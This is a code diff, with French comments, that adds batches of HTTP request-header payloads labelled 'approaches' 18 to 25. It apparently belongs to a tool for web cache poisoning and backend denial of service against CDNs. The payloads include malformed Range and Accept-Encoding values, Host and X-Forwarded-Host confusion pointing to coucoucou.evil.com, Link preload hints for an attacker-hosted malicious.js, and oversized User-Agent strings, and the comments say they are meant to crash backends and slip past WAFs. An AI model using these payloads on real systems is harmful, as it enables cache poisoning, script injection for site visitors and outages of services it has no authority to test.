+        # Mais les backends crashent en essayant de parser
+        # =================================================================
+        {"Range": "coucoucou=0-100"},
+        {"Range": "none=0-0"},
+        {"Range": "bytes 0-100"},
+        {"Range": "bytes=--"},
+        {"Range": "bytes=0-0\x00"},
+
+        # =================================================================
+        # APPROCHE 18 — Headers GPC/DNT (deprecated mais parsés)
+        # =================================================================
+        {"DNT": "coucoucou"},
+        {"Sec-GPC": "coucoucou"},
+        {"Tk": "coucoucou"},
+        {"DNT": "99"},
+
+        # =================================================================
+        # APPROCHE 19 — X-Robots-Tag et indexing headers sur requête
+        # Normalement réponse-only mais certains proxies les traitent
+        # =================================================================
+        {"X-Robots-Tag": "noindex, nofollow"},
+        {"X-Frame-Options": "DENY"},
+
+        # =================================================================
+        # APPROCHE 20 — Encoding Transfer double
+        # Le CDN décode gzip, forward "identity" → origin confus
+        # =================================================================
+        {"Accept-Encoding": "gzip, deflate, br, zstd, coucoucou"},
+        {"Accept-Encoding": "br;q=1.0, gzip;q=0.5, *;q=0"},
+        {"Accept-Encoding": "zstd"},
+        {"Accept-Encoding": "compress"},
+        {"Accept-Encoding": "x-gzip"},
+        {"Accept-Encoding": "x-compress"},
+
+        # =================================================================
+        # APPROCHE 21 — HSTS/Preload headers sur requête
+        # Normalement réponse-only, backend peut parser/crash
+        # =================================================================
+        {"Strict-Transport-Security": "max-age=0"},
+        {"X-Content-Type-Options": "coucoucou"},
+
+        # =================================================================
+        # APPROCHE 22 — Multiple Host confusion
+        # Certains CDNs utilisent le premier, origin le dernier
+        # =================================================================
+        {"Host": "legitimate.com", "X-Forwarded-Host": "coucoucou.evil.com", "X-Host": "coucoucou2.evil.com", "X-Original-Host": "coucoucou3.evil.com"},
+        {"Forwarded": "host=coucoucou.evil.com", "X-Forwarded-Host": "coucoucou2.evil.com"},
+
+        # =================================================================
+        # APPROCHE 23 — Report-To / NEL headers sur requête
+        # =================================================================
+        {"Report-To": '{"group":"coucoucou","max_age":0,"endpoints":[]}'},
+        {"NEL": '{"report_to":"coucoucou","max_age":0}'},
+
+        # =================================================================
+        # APPROCHE 24 — HTTP/2 PUSH hint
+        # =================================================================
+        {"X-Associated-Content": '"https://coucoucou.evil.com/malicious.js"'},
+        {"Link": "<https://coucoucou.evil.com>; rel=preload; as=script"},
+        {"Link": "</>; rel=coucoucou; nopush"},
+
+        # =================================================================
+        # APPROCHE 25 — Très long User-Agent (légitime mais oversized)
+        # Les WAFs ne bloquent JAMAIS User-Agent. Le backend peut 400.
+        # =================================================================
+        {"User-Agent": "Mozilla/5.0 " + "A" * 8000},
+        {"User-Agent": "Mozilla/5.0 " + "A" * 16000},
+        {"User-Agent": ""},
